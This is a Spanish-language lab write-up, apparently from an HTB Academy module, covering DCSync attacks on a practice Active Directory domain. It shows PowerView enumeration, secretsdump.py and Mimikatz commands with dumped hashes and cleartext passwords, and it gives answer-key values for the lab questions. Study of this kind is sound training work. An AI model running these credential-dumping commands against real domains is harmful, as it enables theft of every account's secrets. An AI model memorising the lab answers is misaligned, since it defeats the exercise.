
A partir del trabajo realizado en la sección anterior de [[ACL (Access Control List)]], ahora tenemos control sobre el usuario `adunn`, quien posee privilegios de DCSync en el dominio `INLANEFREIGHT.LOCAL`. Vamos a profundizar en este ataque y revisar ejemplos de cómo aprovecharlo para comprometer por completo el dominio, tanto desde un equipo atacante con Linux como desde uno con Windows.

##### Montando el escenario

En esta sección iremos alternando entre un equipo atacante con Windows y otro con Linux para mostrar distintos ejemplos del ataque. Puedes desplegar los hosts necesarios al final de la sección y conectarte por RDP al equipo Windows `MS01` usando las credenciales `htb-student:Academy_student_AD!`. Para la parte que requiere interacción desde un entorno Linux (uso de `secretsdump.py`), puedes abrir una consola PowerShell en `MS01` y conectarte por SSH a la IP `172.16.5.225` con las credenciales `htb-student:HTB_@cademy_stdnt!`. Alternativamente, también sería posible realizar todo desde Windows utilizando una versión de `secretsdump.exe` compilada para ese sistema, ya que existen varios repositorios en GitHub con versiones del toolkit Impacket adaptadas para Windows. Esto último podría plantearse como un reto adicional.

### ¿Qué es DCSync y cómo funciona?

DCSync es una técnica que permite robar la base de datos de contraseñas de Active Directory aprovechando el protocolo de replicación entre Domain Controllers. El atacante simula ser un controlador de dominio y solicita los hashes NTLM de los usuarios. Para ello, necesita una cuenta con privilegios de replicación, concretamente con los permisos **Replicating Directory Changes** y **Replicating Directory Changes All**. Estos permisos suelen estar asignados por defecto a los administradores del dominio o Enterprise Admins.

##### Viendo privilegios de replicación de `adunn` a través de ADSI Edit

![[Pasted image 20250722102228.png]]

Es habitual durante una auditoría encontrar cuentas que, sin ser administradores, tienen permisos de replicación. Si se comprometen, pueden utilizarse para obtener el hash NTLM actual de cualquier usuario del dominio, así como los hashes de contraseñas anteriores. En este caso, se muestra un usuario estándar del dominio que ha recibido dichos permisos de replicación.

##### Usando `Get-DomainUser` para ver la membrería de grupo de `adunn`

```powershell
PS C:\htb> Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

PowerView puede utilizarse para verificar que este usuario estándar tiene realmente asignados los permisos necesarios. Primero se obtiene el SID del usuario y luego se consultan todas las ACLs definidas sobre el objeto del dominio (`DC=inlanefreight,DC=local`) utilizando `Get-ObjectAcl`. En este caso, se busca específicamente si existen derechos de replicación y si el usuario `adunn` (referenciado en el comando como `$sid`) los posee. El resultado confirma que efectivamente cuenta con dichos permisos.
##### Usando `Get-ObjectAcl` para comprobar los privilegios de replicación de `adunn`

```powershell-session
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

Si tuviésemos ciertos permisos sobre un usuario, como `WriteDacl`, podríamos asignarle privilegios de replicación a una cuenta bajo nuestro control, ejecutar el ataque DCSync y luego eliminar dichos privilegios para tratar de ocultar el rastro. El ataque puede llevarse a cabo con herramientas como **Mimikatz**, **Invoke-DCSync** o **secretsdump.py** de Impacket. Por ejemplo, al ejecutar `secretsdump.py` con el flag `-just-dc`, se extraen los hashes NTLM y claves Kerberos directamente del fichero NTDS, guardándolos en archivos con el prefijo `inlanefreight_hashes`.

##### Extrayendo hashes NTLM y Kerberos Keys usando `secretsdump.py`

```shell
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

Podemos usar el flag `-just-dc-ntlm` si solo queremos extraer los hashes NTLM, o `-just-dc-user <USUARIO>` para obtener datos de un único usuario. Otras opciones útiles son `-pwd-last-set` para ver cuándo se cambió por última vez cada contraseña, `-history` para obtener el historial de contraseñas (útil para cracking offline o métricas de seguridad), y `-user-status` para identificar cuentas deshabilitadas. Esto permite filtrar esos usuarios al generar estadísticas para el cliente, como el número y porcentaje de contraseñas crackeadas, los 10 passwords más comunes, métricas de longitud y reutilización, reflejando solo cuentas activas. Al usar el flag `-just-dc`, se generan tres archivos: uno con los hashes NTLM, otro con claves Kerberos y un tercero con contraseñas en texto claro (si hay cuentas con cifrado reversible habilitado).

```bash
$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

Aunque es poco común, ocasionalmente encontramos cuentas con cifrado reversible habilitado. Esto suele configurarse para dar soporte a aplicaciones que requieren el uso directo de la contraseña del usuario para autenticarse mediante ciertos protocolos.

##### Visualización de una cuenta con almacenamiento de contraseña mediante cifrado reversible

Si una cuenta tiene activada esta opción, las contraseñas se guardan cifradas con RC4, pero pueden descifrarse fácilmente ya que la clave está en el registro del sistema. Herramientas como `secretsdump.py` pueden extraer estas contraseñas durante un volcado del NTDS, ya sea con permisos de administrador o mediante un ataque DCSync. Las contraseñas seguirán almacenándose de forma reversible hasta que el usuario las cambie manualmente.

![[Pasted image 20250722102912.png]]

##### Enumerando más allá con `Get-ADUser`

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

Hay que tener en cuenta que `userAccountControl` es un atributo de tipo bitmask que contiene múltiples banderas (flags) para describir el estado y configuración de una cuenta de usuario en AD. Cada opción es un valor binario.

| Flag                                | Valor   |
| ----------------------------------- | ------- |
| SCRIPT                              | 1       |
| ACCOUNTDISABLE                      | 2       |
| HOMEDIR_REQUIRED                    | 8       |
| LOCKOUT                             | 16      |
| PASSWD_NOTREQD                      | 32      |
| PASSWD_CANT_CHANGE                  | 64      |
| **PASSWORD_ENCRYPTED_TEXT_ALLOWED** | **128** |
| NORMAL_ACCOUNT                      | 512     |
| DONT_EXPIRE_PASSWORD                | 65536   |

Podemos ver que existe una cuenta, `proxyagent`, que tiene cifrado reversible activado con PowerView:

```powershell
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

Veremos que la herramienta desencriptó la contraseña y nos devolvió en texto claro la misma:

```shell
$ cat inlanefreight_hashes.ntds.cleartext 

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

En algunas auditorías me he encontrado con clientes que almacenaban todas las contraseñas usando cifrado reversible, lo que les permitía volcar el NTDS y hacer auditorías de fortaleza de contraseñas sin recurrir a cracking offline. Este ataque también puede realizarse con Mimikatz, apuntando a un usuario específico, como el administrador integrado. También podría atacarse la cuenta `krbtgt` para generar un Golden Ticket, aunque eso queda fuera del alcance de este módulo. Es importante ejecutar Mimikatz en el contexto de un usuario con privilegios DCSync, lo cual puede lograrse con `runas.exe`.

```cmd
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

Desde la nueva sesión abierta con powershell podemos acontecer el ataque:

```powershell
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```

> En la siguiente sección veremos cómo enumerar y aprovechar posibles accesos remotos asignados a un usuario bajo nuestro control. Entre los métodos que exploraremos se incluyen el uso de Remote Desktop Protocol (RDP), WinRM (o PsRemoting) y acceso administrativo a servidores SQL.

##### _Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer._

> **Respuesta**: syncron

Accedemos por RDP a la primera máquina que nos dan:

```bash
rdesktop -u htb-student \                                                                                                       
         -p 'Academy_student_AD!' \
         -d INLANEFREIGHT.LOCAL \
         10.129.124.134
```

Una vez dentro, abrimos una sesión de PowerShell como administrador, vamos a `C:\Tools` e importamos el módulo de PowerView. Simplemente ejecutamos este comando:

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

![[Pasted image 20250722105056.png]]

Y ahí lo tenemos. 

##### _What is this user's cleartext password?_

> **Respuesta**: Mycleart3xtP@ss!

Lo primero que tenemos que hacer aquí es conectarnos por SSH desde la sesión PowerShell abierta al siguiente equipo: `172.16.5.225` con las credenciales `htb-student:HTB_@cademy_stdnt!`

![[Pasted image 20250722105802.png]]

Ahora tendremos que usar `secretsdump.py` de la siguiente manera:

```powershell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

Nos pedirá contraseña del usuario `adunn`, recordemos que la obtuvimos anteriormente y era `SyncMaster757`. Lo dejamos corriendo un rato porque hay setecientos usuarios, y al final, obtenemos en texto claro la contraseña de `syncron`:

![[Pasted image 20250722110138.png]]

##### _Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer._

> **Respuesta**: 4bb3b317845f0954200a6b0acc9b9f9a

En este caso usamos el mismo comando que antes, solo que esta vez añadimos el usuario al que queremos apuntar:

```
secretsdump.py -outputfile inlanefreight_hashes -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5 
```

![[Pasted image 20250722110347.png]]